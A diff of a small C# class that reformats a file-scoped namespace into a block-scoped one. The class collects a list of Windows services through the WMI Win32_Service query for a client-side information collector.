@@ -1,17 +1,19 @@
 ﻿using Gloom.WmiOps;
 
-namespace Gloom.Client.Features.InfoCollector.Wmi;
-internal class WmiServiceList : WmiInfo
+namespace Gloom.Client.Features.InfoCollector.Wmi
 {
-	public WmiServiceList() : base(WmiOpCodes.ServiceList)
+	internal class WmiServiceList : WmiInfo
 	{
-	}
-
-	public override object Collect()
-	{
-		return new ServiceListResponse
+		public WmiServiceList() : base(WmiOpCodes.ServiceList)
 		{
-			List = Crawl<Win32Service>("Win32_Service")
-		};
+		}
+
+		public override object Collect()
+		{
+			return new ServiceListResponse
+			{
+				List = Crawl<Win32Service>("Win32_Service")
+			};
+		}
 	}
 }
